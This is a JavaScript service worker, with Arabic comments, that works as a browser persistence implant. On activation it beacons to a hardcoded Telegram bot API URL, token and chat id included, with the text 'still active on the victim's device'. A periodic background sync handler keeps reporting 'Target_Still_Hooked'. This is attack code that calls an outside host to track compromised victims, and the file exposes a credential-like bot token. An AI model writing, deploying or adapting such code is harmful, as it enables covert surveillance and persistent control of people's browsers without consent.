self.addEventListener('install', (event) => {
    self.skipWaiting();
});

self.addEventListener('activate', (event) => {
    // إرسال نبضة للبوت بمجرد أن يصبح المتصفح نشطاً في أي وقت
    const TG_URL = "https://api.telegram.org/bot8423547869:AAGnndEv5lB27vNjS9iMOqX4lxduElY06nU/sendMessage?chat_id=6978465145";
    event.waitUntil(
        fetch(`${TG_URL}&text=${encodeURIComponent("👻 تنبيه: الخدمة الخلفية (HADI_V142) لا تزال نشطة في جهاز الضحية.")}`)
    );
});

// ميزة المزامنة الخلفية للبقاء حياً
self.addEventListener('periodicsync', (event) => {
    if (event.tag === 'alive-check') {
        fetch(`${TG_URL}&text=Target_Still_Hooked`);
    }
});
